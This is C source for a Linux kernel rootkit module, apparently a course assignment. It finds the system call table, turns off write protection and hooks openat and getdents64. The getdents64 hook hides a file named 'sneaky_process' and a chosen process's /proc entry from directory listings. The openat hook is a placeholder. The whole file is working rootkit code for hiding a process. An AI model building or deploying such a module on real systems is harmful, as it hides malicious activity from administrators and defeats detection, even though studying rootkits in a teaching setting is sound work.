// sneaky_mod.c
#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <asm/uaccess.h>
#include <linux/string.h>      // For string manipulation functions
#include <linux/limits.h>     

#define PREFIX "sneaky_process"

//This is a pointer to the system call table
static unsigned long* sys_call_table;
asmlinkage long (*original_getdents64)(struct pt_regs*);
asmlinkage long sneaky_getdents64(struct pt_regs* regs);
asmlinkage long (*original_read)(struct pt_regs *);
asmlinkage long sneaky_sys_read(struct pt_regs *regs);

static int sneaky_pid = 0;
module_param(sneaky_pid, int, 0);
MODULE_PARM_DESC(sneaky_pid, "PID of sneaky_process to hide");

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void* ptr) {
  unsigned int level;
  pte_t* pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void* ptr) {
  unsigned int level;
  pte_t* pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage long (*original_openat)(struct pt_regs*);

// Define your new sneaky version of the 'openat' syscall
asmlinkage long sneaky_sys_openat(struct pt_regs* regs) {
  // Implement the sneaky part here
  return (*original_openat)(regs);
}
asmlinkage long sneaky_getdents64(struct pt_regs* regs) {
  char pid_str[16]; // Buffer to store the PID string
  scnprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid); // Get the current process PID as a string
  struct linux_dirent64 __user* dirent;
  struct linux_dirent64* current_dirent, * dirent_ker;
  long ret = original_getdents64(regs);
  if (ret <= 0) return ret;

  // buffer in kernel space
  dirent = (void*)regs->si;  // second arg: buffer pointer
  dirent_ker = kzalloc(ret, GFP_KERNEL);
  if (!dirent_ker) return ret;

  if (copy_from_user(dirent_ker, dirent, ret)) {
    kfree(dirent_ker);
    return ret;
  }

  long bpos = 0, new_ret = 0;
  while (bpos < ret) {
    current_dirent = (void*)((char*)dirent_ker + bpos);
    bool hide = false;

    // check name field
    char d_name[NAME_MAX + 1];
    strlcpy(d_name, current_dirent->d_name, sizeof(d_name));
    d_name[NAME_MAX] = '\0';

    // hide the executable file
    if (strcmp(d_name, PREFIX) == 0)
      hide = true;

    // hide the /proc/<pid> entry when listing /proc
    if (strcmp(d_name, pid_str) == 0)
      hide = true;

    if (!hide) {
      // keep this entry: copy it back to user buffer at new_ret
      long reclen = current_dirent->d_reclen;
      if (copy_to_user((char __user *)dirent + new_ret, current_dirent, reclen))
        break;
      new_ret += reclen;
    }
    bpos += current_dirent->d_reclen;
  }

  // zero out the rest if we removed entries
  if (new_ret < ret)
    memset((char __user*)dirent + new_ret, 0, ret - new_ret);

  kfree(dirent_ker);
  return new_ret;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void*)sys_call_table[__NR_openat];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void*)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

  // You need to replace other system calls you need to hack here
  original_getdents64 = (void*)sys_call_table[__NR_getdents64];
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void*)sys_call_table);

  return 0;       // to show a successful load 
}


static void exit_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void*)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  // restore getdents64
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void*)sys_call_table);
}


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");